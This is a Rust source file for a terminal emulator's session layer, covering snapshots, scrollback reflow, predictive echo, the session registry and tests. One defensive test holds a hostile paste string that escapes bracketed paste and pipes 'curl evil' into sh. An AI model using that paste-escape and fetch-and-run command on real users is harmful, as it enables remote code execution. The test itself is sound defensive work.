
        let mut g = self.inner.lock().map_err(|_| "screen poisoned")?;
        g.screen.resize(rows as usize, cols as usize);
        // Predictions were made against the old geometry and reflow has just
        // moved every one of their cells. Dropping them unscored is the honest
        // move: they did not miss, the ground moved.
        g.predictor.reset();
        g.dirty = vec![true; rows as usize];
        g.full_repaint = true;
        // The viewport is re-wrapped by the line above; history is queued and
        // done a chunk at a time from `snapshot` (§5.6). A drag emits a resize
        // per pointer move, so doing it here would reflow 100k rows forty times.
        self.reflowing
            .store(g.screen.reflow_pending(), Ordering::Release);
        self.generation.fetch_add(1, Ordering::Release);
        Ok(())
    }

    /// One chunk of pending scrollback reflow. Cheap no-op when none is pending.
    ///
    /// Returns true if the visible view changed as a result — only possible while
    /// scrolled back, since reflow does not touch the live grid.
    fn step_reflow(&self) -> bool {
        if !self.reflowing.load(Ordering::Acquire) {
            return false;
        }
        let Ok(mut g) = self.inner.lock() else {
            return false;
        };
        let more = g.screen.reflow_step();
        if !more {
            self.reflowing.store(false, Ordering::Release);
        }
        if g.scroll_offset > 0 {
            // The window onto history now lands on different lines.
            g.scroll_offset = g.scroll_offset.min(g.screen.scrollback().len());
            g.full_repaint = true;
            return true;
        }
        false
    }

    /// Changed rows since the last call. Returns `None` when nothing has changed
    /// since `since`, so an idle terminal costs one atomic load per frame and no
    /// serialization at all.
    /// Scroll the view. Positive `delta` moves back through history.
    ///
    /// Returns the offset actually applied after clamping, so the UI can stop
    /// asking once it has hit the end of the ring.
    pub fn scroll(&self, delta: i64) -> Result<usize, String> {
        // §5.6: "reflow scrollback lazily **on scroll**". Called before the lock
        // below, because it takes the same one.
        self.step_reflow();

        let mut g = self.inner.lock().map_err(|_| "screen poisoned")?;
        let max = g.screen.scrollback().len();
        let want = (g.scroll_offset as i64 + delta).clamp(0, max as i64) as usize;
        if want != g.scroll_offset {
            g.scroll_offset = want;
            // Every visible line changes when the window slides, so this is a
            // repaint, not a damage list.
            g.full_repaint = true;
            self.generation.fetch_add(1, Ordering::Release);
        }
        Ok(want)
    }

    /// Changed rows since the last call. `None` when nothing has changed since
    /// `since`, so an idle terminal costs one atomic load per frame and no
    /// serialization at all.
    pub fn snapshot(&self, since: u64) -> Result<Option<Snapshot>, String> {
        // The polled frame is the background task scrollback reflow does not
        // otherwise have. One atomic load when there is nothing to do.
        if self.step_reflow() {
            self.generation.fetch_add(1, Ordering::Release);
        }

        let generation = self.generation.load(Ordering::Acquire);
        if generation == since {
            return Ok(None);
        }

        let mut g = self.inner.lock().map_err(|_| "screen poisoned")?;
        // `since == 0` is a viewer that has nothing yet — a pane remounted
        // after a tab switch, attaching to a live session. It gets every row,
        // not just the ones damaged since some other viewer last looked.
        let full = g.full_repaint || since == 0;
        let (rows, cols) = (g.screen.grid().rows(), g.screen.grid().cols());
        // The predicted cursor wins when there is one: it is where the character
        // the user just typed appears to be, and drawing the caret behind it is
        // exactly the lag prediction exists to remove (§5.5).
        let cursor = g.predictor.cursor().unwrap_or(g.screen.grid().cursor);
        let title = g.screen.title.clone();
        let modes = g.screen.modes();
        let offset = g.scroll_offset;
        let scroll_max = g.screen.scrollback().len();
        // At most MAX_OUTSTANDING (12) entries, and empty in steady state.
        let overlay: Vec<Overlay> = g.predictor.overlay().collect();

        let mut lines = Vec::new();
        if offset > 0 {
            // Scrolled back: the viewport is a window over
            // [scrollback ++ grid], so nothing maps to the damage list and the
            // whole thing is redrawn.
            // No overlay while scrolled back: a prediction belongs to the live
            // prompt, and painting it into a view of history would put a
            // character where the user is not typing.
            for i in 0..rows {
                lines.push(composed_line(&g.screen, offset, i));
            }
        } else {
            for row in 0..rows {
                let dirty = g.dirty.get(row).copied().unwrap_or(false);
                // ALWAYS send the cursor row, even when the damage list says it
                // is clean.
                //
                // This is the fix for a real bug: after a command's output the
                // shell writes its prompt on the cursor row, and if that single
                // update was ever missed the prompt simply never appeared —
                // until an unrelated resize forced a full repaint. Re-sending
                // one row per frame is far cheaper than a class of bug that
                // makes the terminal look hung.
                let predicted = overlay.iter().any(|o| o.row == row);
                if full || dirty || predicted || row == cursor.row {
                    lines.push(render_line(&g.screen, row, &overlay));
                }
            }
        }

        for d in g.dirty.iter_mut() {
            *d = false;
        }
        g.full_repaint = false;

        Ok(Some(Snapshot {
            generation,
            rows,
            cols,
            cursor_row: cursor.row,
            cursor_col: cursor.col,
            title,
            alive: self.alive.load(Ordering::Acquire),
            lines,
            full: full || offset > 0,
            scroll_offset: offset,
            scroll_max,
            app_cursor: modes.app_cursor,
            // Hidden while scrolled back too: the caret belongs to the live
            // screen, not to a row of history that happens to share its index.
            cursor_visible: modes.cursor_visible && offset == 0,
        }))
    }
}

/// One viewport row while scrolled back `offset` lines.
///
/// Virtual line space is `[scrollback ..., grid rows ...]`; the viewport is the
/// `rows`-long window ending `offset` lines before the live bottom.
fn composed_line(screen: &Screen, offset: usize, viewport_row: usize) -> LineUpdate {
    let sb = screen.scrollback();
    let sb_len = sb.len();
    let top = sb_len.saturating_sub(offset);
    let v = top + viewport_row;

    if v < sb_len {
        if let Some(row) = sb.get(v) {
            return render_cells(screen, &row.glyph, &row.style, viewport_row);
        }
    }
    let grid_row = v - sb_len;
    if grid_row < screen.grid().rows() {
        return render_line(screen, grid_row, &[]).with_row(viewport_row);
    }
    LineUpdate {
        row: viewport_row,
        text: String::new(),
        spans: Vec::new(),
    }
}

impl LineUpdate {
    fn with_row(mut self, row: usize) -> LineUpdate {
        self.row = row;
        self
    }
}

/// One grid row, with any predicted cells painted over it.
///
/// §5.5's overlay, applied at read time. The authoritative grid is never
/// modified by a prediction — that is what makes the hard snap on a mismatch
/// free, since there is nothing to undo.
fn render_line(screen: &Screen, row: usize, overlay: &[Overlay]) -> LineUpdate {
    let (glyphs, styles) = screen.grid().row(row);
    if !overlay.iter().any(|o| o.row == row) {
        return render_cells(screen, glyphs, styles, row);
    }
    // Copies one row, and only while a prediction is outstanding on it. Bounded
    // by MAX_OUTSTANDING rows of `cols` cells.
    let mut g = glyphs.to_vec();
    let mut st = styles.to_vec();
    for o in overlay.iter().filter(|o| o.row == row) {
        if o.col < g.len() {
            g[o.col] = o.glyph;
            st[o.col] = o.style;
        }
    }
    render_cells(screen, &g, &st, row)
}

/// Turn one row of cells into text plus style runs.
///
/// Scrollback rows are trimmed of trailing blanks (core-term §5.6), so they are
/// usually shorter than the grid width. That is fine — the renderer paints the
/// background for the whole row before the text.
fn render_cells(screen: &Screen, glyphs: &[u32], styles: &[StyleId], row: usize) -> LineUpdate {
    let mut text = String::with_capacity(glyphs.len());
    let mut spans: Vec<Span> = Vec::new();

    let mut run_start = 0usize;
    let mut run_style = styles.first().copied().unwrap_or(0);

    for (i, (&g, &st)) in glyphs.iter().zip(styles.iter()).enumerate() {
        if st != run_style {
            spans.push(make_span(screen, run_start, i - run_start, run_style));
            run_start = i;
            run_style = st;
        }
        // WIDE_SPACER and grapheme ids are not produced by the engine yet; until
        // they are, anything that is not a plain codepoint renders as a blank
        // rather than as a random glyph.
        text.push(char::from_u32(g).unwrap_or(' '));
    }
    if !glyphs.is_empty() {
        spans.push(make_span(
            screen,
            run_start,
            glyphs.len() - run_start,
            run_style,
        ));
    }

    LineUpdate { row, text, spans }
}

fn make_span(screen: &Screen, start: usize, len: usize, id: u16) -> Span {
    use opspilot_core_term::style::flags;
    let s: Style = screen.styles().get(id);
    let reverse = s.flags & flags::REVERSE != 0;
    let (fg, bg) = if reverse {
        (css_color(s.bg, true), css_color(s.fg, false))
    } else {
        (css_color(s.fg, false), css_color(s.bg, true))
    };
    Span {
        start,
        len,
        fg,
        bg,
        bold: s.flags & flags::BOLD != 0,
        italic: s.flags & flags::ITALIC != 0,
        underline: s.flags & flags::UNDERLINE != 0,
        reverse,
    }
}

fn home_dir() -> Option<std::path::PathBuf> {
    #[allow(deprecated)]
    std::env::home_dir()
}

/// One session, as the inspector sees it.
#[derive(Serialize, Clone, Debug)]
pub struct SessionStat {
    pub id: SessionId,
    pub remote: bool,
    pub bytes_in: u64,
    pub bytes_out: u64,
    pub rows: usize,
    pub cols: usize,
    pub alive: bool,
    pub title: String,
    /// Predictive echo (§5.5), for the inspector and the perf overlay.
    ///
    /// §5.5 is explicit that this is not optional: "If prediction hit rate is not
    /// instrumented, prediction is not shippable." `None` where prediction is off
    /// — a local shell — because 100% of nothing is a misleading number to show.
    pub prediction: Option<PredictionStat>,
    /// The PTY reader thread has exited. A closed session whose reader is still
    /// running is a leak; this makes one visible instead of silent.
    pub reader_done: bool,
}

#[derive(Serialize, Clone, Debug)]
pub struct PredictionStat {
    /// 0.0–1.0. Meaningless below `samples ≈ 20`, which is also the point at
    /// which the predictor starts acting on it.
    pub hit_rate: f32,
    pub samples: u32,
    pub confirmed: u32,
    pub missed: u32,
    pub timed_out: u32,
    /// Times the queue was discarded whole after a mismatch.
    pub flushes: u32,
    pub outstanding: usize,
    /// The predictor judged this link unpredictable and stopped (§5.5's 85%).
    pub disabled: bool,
    /// The server appears to have echo off — a password prompt.
    pub echo_off: bool,
}

/* ---- Registry ------------------------------------------------------------ */

#[derive(Default)]
pub struct Registry {
    sessions: Mutex<HashMap<SessionId, Arc<Session>>>,
    next: AtomicU64,
}

static REGISTRY: OnceLock<Registry> = OnceLock::new();

pub fn registry() -> &'static Registry {
    REGISTRY.get_or_init(Registry::default)
}

impl Registry {
    pub fn open(&self, rows: u16, cols: u16, shell_id: Option<&str>) -> Result<SessionId, String> {
        let shell = crate::shells::resolve(shell_id)
            .ok_or_else(|| "no usable shell found on this machine".to_string())?;
        let session = Arc::new(Session::spawn(rows, cols, shell)?);
        let id = self.next.fetch_add(1, Ordering::Relaxed) as SessionId + 1;
        self.sessions
            .lock()
            .map_err(|_| "registry poisoned")?
            .insert(id, session);
        Ok(id)
    }

    /// Open a remote shell over a pooled transport.
    pub fn open_ssh(
        &self,
        rows: u16,
        cols: u16,
        transport: Arc<opspilot_core_ssh::Transport>,
    ) -> Result<SessionId, String> {
        let session = Arc::new(Session::spawn_ssh(rows.max(1), cols.max(1), transport)?);
        let id = self.next.fetch_add(1, Ordering::Relaxed) as SessionId + 1;
        self.sessions
            .lock()
            .map_err(|_| "registry poisoned")?
            .insert(id, session);
        Ok(id)
    }

    pub fn open_stream(&self, rows: u16, cols: u16, io: StreamIo, remote: bool) -> Result<SessionId, String> {
        let session = Arc::new(Session::spawn_stream(rows.max(1), cols.max(1), io, remote));
        let id = self.next.fetch_add(1, Ordering::Relaxed) as SessionId + 1;
        self.sessions
            .lock()
            .map_err(|_| "registry poisoned")?
            .insert(id, session);
        Ok(id)
    }

    pub fn get(&self, id: SessionId) -> Result<Arc<Session>, String> {
        self.sessions
            .lock()
            .map_err(|_| "registry poisoned")?
            .get(&id)
            .cloned()
            .ok_or_else(|| format!("no session {id}"))
    }

    /// Per-session detail for the inspector.
    pub fn stats(&self) -> Vec<SessionStat> {
        let Ok(live) = self.sessions.lock() else {
            return Vec::new();
        };
        let mut v: Vec<SessionStat> = live
            .iter()
            .map(|(id, s)| {
                let (bytes_in, bytes_out, remote) = s.traffic();
                let (rows, cols) = s
                    .inner
                    .lock()
                    .map(|g| (g.screen.grid().rows(), g.screen.grid().cols()))
                    .unwrap_or((0, 0));
                let title = s
                    .inner
                    .lock()
                    .map(|g| g.screen.title.clone())
                    .unwrap_or_default();
                SessionStat {
                    id: *id,
                    remote,
                    bytes_in,
                    bytes_out,
                    rows,
                    cols,
                    alive: s.alive.load(Ordering::Acquire),
                    title,
                    prediction: s.prediction_stat(),
                    reader_done: s.reader_exited.load(Ordering::Acquire),
                }
            })
            .collect();
        v.sort_by_key(|s| s.id);
        v
    }

    /// Totals across every open session.
    pub fn totals(&self) -> (usize, u64, u64) {
        let Ok(live) = self.sessions.lock() else {
            return (0, 0, 0);
        };
        let mut bytes_in = 0;
        let mut bytes_out = 0;
        for s in live.values() {
            let (i, o, _) = s.traffic();
            bytes_in += i;
            bytes_out += o;
        }
        (live.len(), bytes_in, bytes_out)
    }

    pub fn close(&self, id: SessionId) -> Result<(), String> {
        let removed = self
            .sessions
            .lock()
            .map_err(|_| "registry poisoned")?
            .remove(&id);
        // Kill explicitly rather than relying on the Arc being the last one:
        // a snapshot call racing the close could still hold a reference.
        if let Some(s) = removed {
            s.kill();
        }
        Ok(())
    }

    /// Close every session. For a frontend that has just (re)started: nothing
    /// in a reloaded webview remembers the old session ids, so without this
    /// each reload left every shell, SSH channel and exec running.
    pub fn close_all(&self) -> usize {
        let all: Vec<Arc<Session>> = match self.sessions.lock() {
            Ok(mut m) => m.drain().map(|(_, s)| s).collect(),
            Err(_) => return 0,
        };
        let n = all.len();
        for s in all {
            s.kill();
        }
        n
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    #[cfg(unix)]
    fn sh(script: &str) -> Session {
        Session::spawn(
            24,
            80,
            crate::shells::ShellInfo {
                id: "t".into(),
                label: "sh".into(),
                program: "/bin/sh".into(),
                args: vec!["-c".into(), script.into()],
                env: Vec::new(),
            },
        )
        .expect("spawn sh")
    }

    /// The program never reads stdin, so the PTY input queue fills. Writes
    /// used to block the caller — the UI thread — at that point, forever. Now
    /// they are refused with an error once the writer's queue is full.
    #[cfg(unix)]
    #[test]
    fn writes_never_block_when_the_program_stops_reading() {
        let s = Arc::new(sh("stty -icanon; sleep 30"));
        let w = Arc::clone(&s);
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let chunk = vec![b'a'; 4096];
            let mut refused = None;
            for i in 0..2_000 {
                if let Err(e) = w.write(&chunk) {
                    refused = Some((i, e));
                    break;
                }
            }
            let _ = tx.send(refused);
        });
        let refused = rx
            .recv_timeout(Duration::from_secs(10))
            .expect("write() blocked: the UI thread would be frozen");
        let (_, e) = refused.expect("8 MB accepted into a program that reads nothing");
        assert!(e.contains("not reading"), "{e}");
        s.kill();
    }

    /// A job that escaped the terminal's session (`setsid`, a daemonising
    /// tool) keeps the PTY slave open after the shell is gone, and neither the
    /// process-group SIGHUP nor the kernel hangup reaches it. The reader used
    /// to block in `read` forever, leaking its thread and the screen it owns,
    /// per closed tab.
    #[cfg(target_os = "linux")]
    #[test]
    fn closing_frees_the_reader_even_if_a_detached_job_holds_the_pty() {
        let s = sh("setsid sleep 300 & echo pid=$!; wait");
        assert!(wait_until(Duration::from_secs(5), || screen_text(&s).contains("pid=")));
        let pid: i32 = screen_text(&s)
            .split("pid=")
            .nth(1)
            .and_then(|t| t.split_whitespace().next())
            .and_then(|n| n.parse().ok())
            .expect("pid");
        let exited = Arc::clone(&s.reader_exited);
        s.kill();
        drop(s);
        let ok = wait_until(Duration::from_secs(5), || exited.load(Ordering::Acquire));
        unsafe {
            libc::kill(pid, libc::SIGKILL); // don't leave the test's sleep behind
        }
        assert!(ok, "reader thread still alive after close");
    }

    #[cfg(unix)]
    #[test]
    fn close_all_closes_every_session() {
        let reg = Registry::default();
        let a = reg.open(24, 80, None).unwrap();
        let b = reg.open(24, 80, None).unwrap();
        assert_eq!(reg.close_all(), 2);
        assert!(reg.get(a).is_err() && reg.get(b).is_err());
    }

    #[test]
    fn bare_lf_becomes_crlf_even_across_chunks() {
        let mut prev = 0u8;
        assert_eq!(lf_to_crlf(b"a\nb\r\nc", &mut prev), b"a\r\nb\r\nc");
        // CR at the end of one chunk, LF at the start of the next: one CR, not two.
        let mut prev = 0u8;
        let mut out = lf_to_crlf(b"x\r", &mut prev);
        out.extend(lf_to_crlf(b"\ny\n", &mut prev));
        assert_eq!(out, b"x\r\ny\r\n");
    }

    /// A stream session plus the producer's ends of its channels.
    type StreamHarness = (
        Session,
        tokio::sync::mpsc::Sender<Vec<u8>>,
        Option<tokio::sync::mpsc::Receiver<Vec<u8>>>,
        tokio::sync::mpsc::Receiver<(u16, u16)>,
    );

    fn stream_session(read_only: bool, crlf: bool) -> StreamHarness {
        use tokio::sync::mpsc::channel;
        let (out_tx, out_rx) = channel(STREAM_DEPTH);
        let (in_tx, in_rx) = channel(STREAM_DEPTH);
        let (rs_tx, rs_rx) = channel(4);
        let io = StreamIo {
            output: out_rx,
            input: (!read_only).then_some(in_tx),
            resize: Some(rs_tx),
            lf_to_crlf: crlf,
        };
        let s = Session::spawn_stream(5, 20, io, false);
        (s, out_tx, (!read_only).then_some(in_rx), rs_rx)
    }

    #[test]
    fn a_stream_renders_its_output_and_forwards_input_and_resizes() {
        let (s, out, input, mut resize) = stream_session(false, true);
        out.blocking_send(b"line1\nline2".to_vec()).unwrap();
        assert!(wait_until(Duration::from_secs(5), || screen_text(&s).contains("line2")));
        // With CRLF translation, line2 starts in column 0, not after line1.
        assert!(screen_text(&s).lines().nth(1).unwrap().starts_with("line2"));

        s.write(b"ls\r").unwrap();
        let mut input = input.unwrap();
        assert_eq!(input.blocking_recv().unwrap(), b"ls\r");
        s.resize(10, 40).unwrap();
        assert_eq!(resize.blocking_recv().unwrap(), (10, 40));
    }

    #[test]
    fn a_read_only_stream_drops_keystrokes() {
        let (s, _out, input, _rs) = stream_session(true, false);
        assert!(input.is_none());
        assert!(s.write(b"q").is_ok(), "typing into a log must not raise an error");
    }

    #[test]
    fn closing_a_stream_session_tells_the_producer() {
        let (s, out, input, _rs) = stream_session(false, false);
        let mut input = input.unwrap();
        s.kill();
        // Keystroke channel closed...
        assert!(input.blocking_recv().is_none());
        // ...and the output side refuses further chunks once the reader stops.
        assert!(wait_until(Duration::from_secs(5), || out.is_closed()));
        assert!(!s.alive.load(Ordering::Acquire));
    }

    #[test]
    fn paste_turns_every_line_ending_into_enter() {
        assert_eq!(paste_bytes("a\nb", false), b"a\rb");
        assert_eq!(paste_bytes("a\r\nb\r\n", false), b"a\rb\r");
        assert_eq!(paste_bytes("a\rb", false), b"a\rb");
        assert_eq!(paste_bytes("", false), b"");
        // Multi-byte UTF-8 passes through untouched.
        assert_eq!(paste_bytes("é→\n", false), "é→\r".as_bytes());
    }

    #[test]
    fn bracketed_paste_is_wrapped() {
        assert_eq!(paste_bytes("ls\n", true), b"\x1b[200~ls\r\x1b[201~");
        assert!(is_paste(&paste_bytes("x", true)));
    }

    #[test]
    fn pasted_text_cannot_close_the_bracket_early() {
        // The attack: a web page hides `ESC[201~` in copyable text, so
        // everything after it is typed rather than pasted and the newline runs
        // it. The only end marker in the output must be ours, at the very end.
        let hostile = "echo safe\x1b[201~curl evil | sh\n";
        let out = paste_bytes(hostile, true);
        let ends = out.windows(PASTE_END.len()).filter(|w| *w == PASTE_END).count();
        assert_eq!(ends, 1, "{:?}", String::from_utf8_lossy(&out));
        assert!(out.ends_with(PASTE_END));
        assert_eq!(out, b"\x1b[200~echo safecurl evil | sh\r\x1b[201~");
    }

    #[test]
    fn a_partial_end_marker_is_kept_verbatim() {
        // Only the complete sequence is special; a prefix of it is just text.
        assert_eq!(paste_bytes("\x1b[201", true), b"\x1b[200~\x1b[201\x1b[201~");
    }

    /// Poll until `f` is true or the deadline passes. A shell takes an
    /// unpredictable moment to start and print a prompt, so a fixed sleep would
    /// be either slow or flaky.
    /// Whatever this machine's default shell is. The tests exercise the PTY
    /// plumbing, not any particular shell's behaviour.
    fn default_shell() -> crate::shells::ShellInfo {
        crate::shells::resolve(None).expect("a shell must exist")
    }

    fn wait_until(timeout: Duration, mut f: impl FnMut() -> bool) -> bool {
        let start = Instant::now();
        while start.elapsed() < timeout {
            if f() {
                return true;
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        false
    }

    fn screen_text(session: &Session) -> String {
        let g = session.inner.lock().unwrap();
        let grid = g.screen.grid();
        (0..grid.rows())
            .map(|r| {
                grid.row(r)
                    .0
                    .iter()
                    .map(|&c| char::from_u32(c).unwrap_or(' '))
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// The end-to-end proof that this is a real terminal: spawn a real shell,
    /// send a real command, and read the output back out of the grid.
    #[test]
    fn a_real_shell_echoes_into_the_grid() {
        let session = Session::spawn(24, 80, default_shell()).expect("spawn a shell");

        assert!(
            wait_until(Duration::from_secs(10), || !screen_text(&session)
                .trim()
                .is_empty()),
            "shell produced no prompt"
        );

        session.write(b"echo opspilot_marker\r").unwrap();

        let found = wait_until(Duration::from_secs(10), || {
            // Two occurrences: the echoed command line, and its output.
            screen_text(&session).matches("opspilot_marker").count() >= 2
        });
        assert!(
            found,
            "command output never appeared. Screen was:\n{}",
            screen_text(&session)
        );
    }

    /// `sh -c <script>` on a PTY: a program that draws no prompt, so nothing
    /// but the script touches the terminal modes.
    #[cfg(unix)]
    fn run_sh(script: &str) -> Session {
        let sh = crate::shells::ShellInfo {
            id: "test-sh".into(),
            label: "sh".into(),
            program: "/bin/sh".into(),
            args: vec!["-c".into(), script.into()],
            env: Vec::new(),
        };
        Session::spawn(24, 80, sh).expect("spawn sh")
    }

    /// DECCKM and DECTCEM set by a real program reach the snapshot, which is
    /// where the keyboard encoder reads them. Without this, arrows in htop and
    /// nano print letters on Linux.
    ///
    /// Not tested at a shell prompt: zsh sets DECCKM itself every time it draws
    /// one (terminfo `smkx`), which is the strongest argument for honouring it.
    #[cfg(unix)]
    #[test]
    fn modes_set_by_the_program_reach_the_snapshot() {
        let session = run_sh("printf '\\033[?1h\\033[?2004h\\033[?25l'; echo ready; sleep 5");
        assert!(
            wait_until(Duration::from_secs(10), || screen_text(&session).contains("ready")),
            "program never ran. Screen was:\n{}",
            screen_text(&session)
        );
        let snap = session.snapshot(0).unwrap().expect("a snapshot");
        assert!(snap.app_cursor, "DECCKM not reported");
        assert!(!snap.cursor_visible, "DECTCEM off not reported");
        assert!(session.inner.lock().unwrap().screen.modes().bracketed_paste);
    }

    /// A paste reaches the program as typed text with CR line endings, and in
    /// bracketed mode the program receives the markers around it.
    // GNU `od` column layout; BSD's differs.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_paste_reaches_the_program_bracketed() {
        // `od -c` shows exactly which bytes arrived. Raw mode so the line
        // discipline passes ESC and CR through untranslated.
        let session = run_sh(
            "printf '\\033[?2004h'; stty raw -echo; echo ready; \
             head -c 16 | od -An -c; sleep 5",
        );
        assert!(wait_until(Duration::from_secs(10), || screen_text(&session)
            .contains("ready")));
        // 4 + 2 bytes of text, 6 + 6 of markers = 18; `head -c 16` stops
        // before the end marker's last two bytes, which is enough to see it.
        session.paste("ab\r\ncd").unwrap();
        let ok = wait_until(Duration::from_secs(10), || {
            let t = screen_text(&session);
            // od prints ESC as 033 and CR as \r: start marker, text with ONE
            // CR for the CRLF, then the start of the end marker.
            t.contains("033   [   2   0   0   ~   a   b  \\r   c   d 033   [   2   0")
        });
        assert!(ok, "unexpected bytes. Screen was:\n{}", screen_text(&session));
    }

    #[test]
    fn snapshots_are_incremental_and_idle_costs_nothing() {
        let session = Session::spawn(24, 80, default_shell()).expect("spawn a shell");
        assert!(wait_until(Duration::from_secs(10), || session
            .generation
            .load(Ordering::Acquire)
            > 1));

        let first = session.snapshot(0).unwrap().expect("first snapshot");
        assert!(first.full, "the first snapshot must be a full repaint");
        assert_eq!(first.lines.len(), 24);

        // Nothing changed since: no snapshot at all, so an idle terminal
        // serializes nothing per frame.
        assert!(session.snapshot(first.generation).unwrap().is_none());

        session.write(b"echo second\r").unwrap();
        assert!(wait_until(Duration::from_secs(10), || session
            .snapshot(first.generation)
            .unwrap()
            .is_some()));

        let next = session.snapshot(first.generation).unwrap().unwrap();
        assert!(!next.full, "later snapshots must be incremental");
        assert!(
            next.lines.len() < 24,
            "only changed rows should be sent, got {}",
            next.lines.len()
        );
    }

    #[test]
    fn resize_forces_a_full_repaint() {
        let session = Session::spawn(10, 40, default_shell()).expect("spawn a shell");
        let s = session.snapshot(0).unwrap().unwrap();
        session.resize(20, 60).unwrap();
        let after = session.snapshot(s.generation).unwrap().unwrap();
        assert!(after.full);
        assert_eq!(after.rows, 20);
        assert_eq!(after.cols, 60);
        assert_eq!(after.lines.len(), 20);
    }

    /// §5.6's split: the resize itself must not pay for history, and the polled
    /// frame must actually drain it.
    ///
    /// Without the second half the queue would sit pending forever and history
    /// would stay at the old width — a bug with no symptom until someone scrolls
    /// back far enough to see truncated lines.
    #[test]
    fn a_resize_queues_history_reflow_and_polled_frames_drain_it() {
        let session = Session::spawn(4, 20, default_shell()).expect("spawn a shell");

        // Produce enough output to push lines into history.
        for _ in 0..12 {
            session.write(b"echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r").unwrap();
        }
        assert!(
            wait_until(Duration::from_secs(10), || {
                session.inner.lock().unwrap().screen.scrollback().len() > 4
            }),
            "no scrollback accumulated"
        );

        session.resize(4, 12).unwrap();
        assert!(
            session.reflowing.load(Ordering::Acquire),
            "a width change must queue history reflow"
        );

        // The UI polls; each poll does one chunk.
        let mut since = 0;
        for _ in 0..50 {
            if !session.reflowing.load(Ordering::Acquire) {
                break;
            }
            if let Some(s) = session.snapshot(since).unwrap() {
                since = s.generation;
            }
        }
        assert!(
            !session.reflowing.load(Ordering::Acquire),
            "polled frames did not drain the reflow queue"
        );

        // And the re-wrapped history honours the new width.
        let g = session.inner.lock().unwrap();
        assert!(
            g.screen.scrollback().iter().all(|r| r.len() <= 12),
            "a history row is wider than the terminal"
        );
    }

    /* ---- Predictive echo (§5.5) -------------------------------------------- */

    #[test]
    fn a_bracketed_paste_is_recognised() {
        // §5.5 forbids predicting through one: it is not echoed character by
        // character, so every prediction inside it would miss.
        assert!(is_paste(b"\x1b[200~ls -l\x1b[201~"));
        assert!(!is_paste(b"ls -l"));
        assert!(!is_paste(b"\x1b[C")); // an arrow key is not a paste
    }

    /// Prediction is off for a local shell, and the telemetry says so.
    ///
    /// §5.5's value is the round trip it hides. On a PTY the echo is back before
    /// the next frame, so a prediction there is a risk taken for nothing — and
    /// reporting a 100% hit rate for it would be a meaningless number in the
    /// perf overlay.
    #[test]
    fn a_local_shell_does_not_predict() {
        let session = Session::spawn(6, 40, default_shell()).expect("spawn a shell");
        assert!(session.prediction_stat().is_none());

        let mut g = session.inner.lock().unwrap();
        assert_eq!(
            session.predict(&mut g, b"x"),
            0,
            "a local session must not predict"
        );
    }

    /// The wiring §1.6 was missing: a prediction must reach the snapshot.
    ///
    /// Drives the same `predict` path `write` uses, then reads a snapshot the way
    /// the UI does. The bytes are deliberately not sent to the shell, so the
    /// assertion cannot race the real echo — the predictor's own reconciliation
    /// is covered by `core-term`'s tests, including a proptest for convergence.
    #[test]
    fn a_prediction_appears_in_the_snapshot_and_moves_the_cursor() {
        let session = Session::spawn(6, 40, default_shell()).expect("spawn a shell");
        assert!(
            wait_until(Duration::from_secs(10), || !screen_text(&session)
                .trim()
                .is_empty()),
            "shell produced no prompt"
        );

        // Force the remote configuration onto a local session: a real link is
        // what this cannot have, and the code under test is the app's overlay
        // plumbing rather than the predictor's arithmetic.
        let (row, col, since) = {
            let mut g = session.inner.lock().unwrap();
            g.predictor = Predictor::new(PredictConfig {
                enabled: true,
                underline_unconfirmed: false,
            });
            let c = g.screen.grid().cursor;
            drop(g);
            let s = session.snapshot(0).unwrap().expect("a baseline snapshot");
            (c.row, c.col, s.generation)
        };

        {
            let mut g = session.inner.lock().unwrap();
            assert_eq!(session.predict(&mut g, b"Z"), 1, "'Z' must be predictable");
        }

        let snap = session
            .snapshot(since)
            .unwrap()
            .expect("predicting must move the generation, or nothing repaints");
        let line = snap
            .lines
            .iter()
            .find(|l| l.row == row)
            .expect("the predicted row must be in the update");
        assert_eq!(
            line.text.chars().nth(col),
            Some('Z'),
            "the predicted glyph is not in the snapshot: {:?}",
            line.text
        );
        assert_eq!(
            (snap.cursor_row, snap.cursor_col),
            (row, col + 1),
            "the caret must sit after the predicted character, not behind it"
        );

        // The authoritative grid is untouched — which is what makes the hard snap
        // on a mismatch free.
        let g = session.inner.lock().unwrap();
        assert_ne!(g.screen.grid().cell(row, col).0, 'Z' as u32);
    }

    #[test]
    fn colors_resolve_to_css() {
        assert_eq!(css_color(color::DEFAULT_FG, false), DEFAULT_FG_CSS);
        assert_eq!(css_color(color::DEFAULT_BG, true), DEFAULT_BG_CSS);
        assert_eq!(css_color(color::indexed(1), false), ANSI[1]);
        assert_eq!(css_color(color::rgb(0xF2, 0xA9, 0x3B), false), "#f2a93b");
        // 256-colour cube and greyscale must not panic or produce bad CSS.
        for i in 0..=255u8 {
            let s = css_color(color::indexed(i), false);
            assert!(s.starts_with('#') && s.len() == 7, "bad css for {i}: {s}");
        }
    }
}
